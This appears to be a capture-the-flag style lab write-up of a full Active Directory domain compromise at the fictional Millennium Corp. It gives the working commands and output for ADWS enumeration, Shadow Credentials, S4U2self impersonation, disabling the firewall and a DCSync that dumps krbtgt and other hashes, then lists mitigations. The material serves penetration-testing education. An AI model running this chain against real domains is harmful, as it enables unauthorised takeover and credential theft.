---
title: "Millennium Corp — HackSmarter Pro Labs"
pubDatetime: 2026-11-05T12:00:00Z
draft: false
tags:
  - "HackSmarter"
  - "Millennium Corp"
  - "Active Directory"
  - "ADWS"
  - "Shadow Credentials"
  - "Kerberos"
  - "S4U2self"
  - "BloodHound"
  - "DCSync"
  - "PKINIT"
  - "GenericAll"
  - "GenericWrite"
  - "Assumed Breach"
description: "Millennium Corp follow-up assessment: full domain compromise via ADWS-only AD enumeration (SOAPy + Soaphound), Shadow Credentials chained from Domain Users → Sully → DC01$, S4U2self impersonation of a Domain Admin, and DCSync to extract the krbtgt hash — all without touching SMB or LDAP."
heroImage: "/assets/images/posts/Millennium-HSL/portada.png"
---
## 1. Introduction

Millennium Corp, following a previous pentest that exposed SMB and LDAP attack paths, implemented host-level firewall restrictions on those protocols. The goal of this follow-up assessment was to demonstrate that these mitigations are insufficient.

The initial condition is an **assumed breach** with low-privilege credentials (`tester:Pencil Testers`) inside the corporate network. The final objective: obtain the **NT hash of krbtgt**, proving full compromise of the `MILLENNIUM.CORP` domain.

### Attack Path Summary

```text
tester (Domain Users)
        ↓
ADWS Enumeration (SOAPy + Soaphound) — no LDAP/SMB needed
        ↓
BloodHound CE → Domain Users GenericAll → Sully
        ↓
Shadow Credentials on Sully → NT hash Sully
        ↓
Sully GenericWrite → DC01$ Shadow Credentials → TGT DC01$
        ↓
S4U2self → Service Ticket as ATHENA (Domain Admin)
        ↓
WinRM as ATHENA → Disable Firewall
        ↓
DCSync → krbtgt hash
```

---

## 2. Reconnaissance

### Initial Scan

```bash
┌──(iamwin㉿apete)-[~/Documents/HSL]
└─$ rustscan -a 10.0.16.51 --ulimit 1000 -t 1000 -- -sCV -Pn -n
```

Confirmed open ports:

| Port | Service |
|---|---|
| `53` | DNS |
| `88` | Kerberos |
| `135` | RPC |
| `3389` | RDP |
| `5985` | WinRM |
| `9389` | ADWS |

### Domain Identification

```bash
┌──(iamwin㉿apete)-[~/Documents/HSL]
└─$ netexec rdp 10.0.16.51 -u tester -p 'Pencil Testers'
RDP  10.0.16.51  3389  DC01  [*] Windows Server 2022 Build 20348 (name:DC01) (domain:MILLENNIUM.CORP) (nla:True)
RDP  10.0.16.51  3389  DC01  [+] MILLENNIUM.CORP\tester:Pencil Testers
```

```bash
┌──(iamwin㉿apete)-[~/Documents/HSL]
└─$ echo "10.0.16.51  DC01.MILLENNIUM.CORP MILLENNIUM.CORP DC01" | sudo tee -a /etc/hosts
```

---

## 3. ADWS Enumeration with SOAPy

With LDAP blocked, port **9389 (ADWS)** became the primary enumeration vector. ADWS (Active Directory Web Services) exposes LDAP/AD functionality over SOAP/WCF — it allows querying directory objects without touching port 389. It is the backend that `Get-ADUser` uses in PowerShell.

> 📖 References: [HackTricks — ADWS Enumeration](https://hacktricks.wiki/es/windows-hardening/active-directory-methodology/adws-enumeration.html) · [SOAPy Wiki](https://github.com/logangoins/SOAPy/wiki) · [Soaphound.py](https://github.com/j4s0nmo0n/Soaphound.py)

**SOAPy** is the main tool for interacting with ADWS from Linux:

```bash
┌──(iamwin㉿apete)-[~/Documents/HSL]
└─$ pipx install git+https://github.com/logangoins/SOAPy
```

```bash
┌──(iamwin㉿apete)-[~/Documents/HSL]
└─$ SOAPy 'MILLENNIUM.CORP/tester:Pencil Testers@DC01.MILLENNIUM.CORP' --users --show
```

Users discovered:

| User | OU | Groups | Notes |
|---|---|---|---|
| Administrator | Users | DA, EA, SA, Schema Admins | Built-in |
| **ATHENA** | ITOps | **Domain Admins** | Tier0, final target |
| **Sully** | ITOps | — | Junior Sysadmin |
| tester | Vendors | — | Initial account |
| krbtgt | Users | — | Target: NT hash |
| Guest | Users | Guests | Disabled |

```bash
┌──(iamwin㉿apete)-[~/Documents/HSL]
└─$ SOAPy 'MILLENNIUM.CORP/tester:Pencil Testers@DC01.MILLENNIUM.CORP' --groups --show
┌──(iamwin㉿apete)-[~/Documents/HSL]
└─$ SOAPy 'MILLENNIUM.CORP/tester:Pencil Testers@DC01.MILLENNIUM.CORP' --computers --show
┌──(iamwin㉿apete)-[~/Documents/HSL]
└─$ SOAPy 'MILLENNIUM.CORP/tester:Pencil Testers@DC01.MILLENNIUM.CORP' --spns --show
┌──(iamwin㉿apete)-[~/Documents/HSL]
└─$ SOAPy 'MILLENNIUM.CORP/tester:Pencil Testers@DC01.MILLENNIUM.CORP' --rbcds --show
```

Confirmed: `tester` does not belong to any privileged group — only `Domain Users` (primaryGroupID: 513).

---

## 4. ACL Mapping with BloodHound CE

For BloodHound CE-compatible data collection, **Soaphound.py** was used. It operates exclusively over ADWS (TCP:9389) without touching SMB or LDAP:

```bash
┌──(iamwin㉿apete)-[~/Documents/HSL]
└─$ soaphound -d MILLENNIUM.CORP -u tester -p 'Pencil Testers' \
  -dc DC01.MILLENNIUM.CORP -dc-ip 10.0.16.51 -c Stealth --zip
[INFO] Users collected : 6
[INFO] Computers collected : 1
[INFO] Groups collected : 48
Zip file created at : 20261105113036_bloodhound.zip
[+] Collection completed in 9.6s
```

The `-c Stealth` flag (formerly `-c ADWSOnly`) restricts all collection to ADWS, without attempting connections to SYSVOL, SMB, or RPC on the hosts. The resulting zip was imported directly into BloodHound CE, revealing the full attack path:

![BloodHound attack path](/assets/images/posts/Millennium-HSL/hs1.png)

```
tester → MemberOf → Domain Users → GenericAll → Sully → GenericWrite → DC01$
```

**Key edge:** `Domain Users` has `GenericAll` over `Sully`. Any domain user — including `tester` — can modify Sully's attributes, including `msDS-KeyCredentialLink`, enabling Shadow Credentials.

**Second edge:** `Sully` has `GenericWrite` over `DC01$`, allowing the same attack against the Domain Controller account.

---

## 5. Shadow Credentials on Sully

Leveraging `Domain Users`' `GenericAll` over Sully, a KeyCredential was injected into Sully's `msDS-KeyCredentialLink` attribute using SOAPy:

```bash
┌──(iamwin㉿apete)-[~/Documents/HSL]
└─$ SOAPy 'MILLENNIUM.CORP/tester:Pencil Testers@DC01.MILLENNIUM.CORP' \
  --shadow-creds add \
  --shadow-target 'Sully'
[+] KeyCredential generated with DeviceID: d28cac12-1113-879c-410c-37a9884ffb0a
[+] Saved PFX certificate: eYcui5v4.pfx
[+] PFX password: 2QllNAyoZ29yFXcNptyw
```

The generated PFX certificate was used with Certipy to authenticate via PKINIT and obtain Sully's NT hash:

```bash
┌──(iamwin㉿apete)-[~/Documents/HSL]
└─$ certipy auth -pfx eYcui5v4.pfx -password '2QllNAyoZ29yFXcNptyw' \
  -username Sully -domain MILLENNIUM.CORP -dc-ip 10.0.16.51
[*] Got TGT
[*] Got hash for 'sully@millennium.corp': aad3b435b51404eeaad3b435b51404ee:7824282ac1df535de6726dac2b68556e
```

---

## 6. Shadow Credentials on DC01$

With Sully's NT hash, the same attack was repeated against `DC01$` via the `GenericWrite` edge:

```bash
┌──(iamwin㉿apete)-[~/Documents/HSL]
└─$ SOAPy 'MILLENNIUM.CORP/Sully@DC01.MILLENNIUM.CORP' \
  -nt 7824282ac1df535de6726dac2b68556e \
  --shadow-creds add \
  --shadow-target 'DC01$'
[+] KeyCredential generated with DeviceID: 10886fef-9642-d8e6-ee17-e15bd2fc43b0
[+] Saved PFX certificate: h5dycy8z.pfx
[+] PFX password: 9aZm3FWr3Ybc0KVexkjB
```

PKINIT authentication as the Domain Controller account:

```bash
┌──(iamwin㉿apete)-[~/Documents/HSL]
└─$ certipy auth -pfx h5dycy8z.pfx -password '9aZm3FWr3Ybc0KVexkjB' \
  -username 'DC01$' -domain MILLENNIUM.CORP -dc-ip 10.0.16.51
[*] Got TGT
[*] Wrote credential cache to 'dc01.ccache'
[*] Got hash for 'dc01$@millennium.corp': aad3b435b51404eeaad3b435b51404ee:d4e078b12268d0399e512c688462394a
```

---

## 7. S4U2self — Impersonating ATHENA

With `DC01$`'s TGT, a Domain Controller can obtain service tickets for any user to itself. S4U2self was used to impersonate ATHENA and get a service ticket for WinRM:

```bash
┌──(iamwin㉿apete)-[~/Documents/HSL]
└─$ export KRB5CCNAME=$(pwd)/dc01.ccache

┌──(iamwin㉿apete)-[~/Documents/HSL]
└─$ getST.py \
  -spn HTTP/DC01.MILLENNIUM.CORP \
  -impersonate athena \
  -dc-ip 10.0.16.51 \
  -k -no-pass \
  'MILLENNIUM.CORP/DC01$' \
  -self \
  -altservice HTTP/DC01.MILLENNIUM.CORP
[*] Impersonating athena
[*] Changing service from DC01$@MILLENNIUM.CORP to HTTP/DC01.MILLENNIUM.CORP@MILLENNIUM.CORP
[*] Saving ticket in athena@HTTP_DC01.MILLENNIUM.CORP@MILLENNIUM.CORP.ccache
```

> The `-altservice HTTP/DC01.MILLENNIUM.CORP` flag rewrites the ticket's SPN so WinRM (port 5985) accepts it.

With this ticket, a shell was obtained as ATHENA (Domain Admin):

```bash
┌──(iamwin㉿apete)-[~/Documents/HSL]
└─$ export KRB5CCNAME=$(pwd)/athena@HTTP_DC01.MILLENNIUM.CORP@MILLENNIUM.CORP.ccache

┌──(iamwin㉿apete)-[~/Documents/HSL]
└─$ evil-winrm -i DC01.MILLENNIUM.CORP -r MILLENNIUM.CORP
                                        
Evil-WinRM shell v4.1
                                        
Info: Establishing connection to remote endpoint
                                        
Info: Connection successful
```

With ATHENA's access, the host firewall was disabled to enable SMB and allow DCSync from Linux:

```powershell
*Evil-WinRM* PS C:\Users\ATHENA\Documents> Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
*Evil-WinRM* PS C:\Users\ATHENA\Documents> Get-NetFirewallProfile | Select Name,Enabled

Name    Enabled
----    -------
Domain    False
Private   False
Public    False
```

---

## 8. DCSync — KRBTGT Hash

With ATHENA's ccache and SMB now reachable, a full domain DCSync was executed via netexec:

```bash
┌──(iamwin㉿apete)-[~/Documents/HSL]
└─$ nxc smb DC01.MILLENNIUM.CORP --use-kcache --ntds
SMB  DC01.MILLENNIUM.CORP  445  DC01  [+] MILLENNIUM.CORP\athena from ccache (Pwn3d!)
SMB  DC01.MILLENNIUM.CORP  445  DC01  Administrator:500:aad3b435b51404eeaad3b435b51404ee:4366ec0f86e29be2a4a5e87a1ba922ec:::
SMB  DC01.MILLENNIUM.CORP  445  DC01  krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5c72593d9552612093430f0b40d112bc:::
SMB  DC01.MILLENNIUM.CORP  445  DC01  MILLENNIUM.CORP\ATHENA:1106:aad3b435b51404eeaad3b435b51404ee:ab3771ce4ec53c16e4feae2b331cb9fe:::
SMB  DC01.MILLENNIUM.CORP  445  DC01  MILLENNIUM.CORP\Sully:1107:aad3b435b51404eeaad3b435b51404ee:7824282ac1df535de6726dac2b68556e:::
```

Hashes obtained:

| Account | NT Hash |
|---|---|
| Administrator | `4366ec0f86e29be2a4a5e87a1ba922ec` |
| **krbtgt** | **`5c72593d9552612093430f0b40d112bc`** |
| ATHENA | `ab3771ce4ec53c16e4feae2b331cb9fe` |
| Sully | `7824282ac1df535de6726dac2b68556e` |
| tester | `879aa860ba74fd41c5c05addd70a1a77` |
| DC01$ | `d4e078b12268d0399e512c688462394a` |

**KRBTGT NT Hash: `5c72593d9552612093430f0b40d112bc`** — domain fully compromised.

---

## 9. Conclusions & Mitigations

Millennium Corp blocked SMB and LDAP but left exposed the protocols that functionally replace them. The full attack chain operated over:

- **Port 88** (Kerberos) — authentication and ticket retrieval
- **Port 9389** (ADWS) — full AD enumeration without LDAP
- **Port 445** (SMB) — only at the end, with a DA Kerberos ticket

**Attack chain summary:**

```
tester (Domain Users)
  → GenericAll over Sully (Shadow Credentials)
  → NT hash Sully
  → GenericWrite over DC01$ (Shadow Credentials)
  → NT hash DC01$ + TGT
  → S4U2self → ATHENA ticket (DA)
  → DCSync → krbtgt hash
```

### Mitigation Recommendations

1. **Restrict ADWS (9389):** Allow access only from authorized management workstations.
2. **Audit GenericAll/GenericWrite in ACLs:** Remove the `GenericAll` permission from `Domain Users` over user accounts.
3. **Privileged Access Workstations (PAW):** Separate Tier0 accounts (ATHENA) from day-to-day operations.
4. **Protect msDS-KeyCredentialLink:** Monitor writes to this attribute — a strong indicator of Shadow Credentials abuse.
5. **Review machine delegation:** Audit which accounts hold `GenericWrite` over computer objects, especially Domain Controllers.
6. **Enable Protected Users:** For Tier0 accounts like ATHENA — prevents NTLM and restricts weak Kerberos encryption types.

---

> *"To stop doubting is to stop advancing."*
>
> — Max Planck
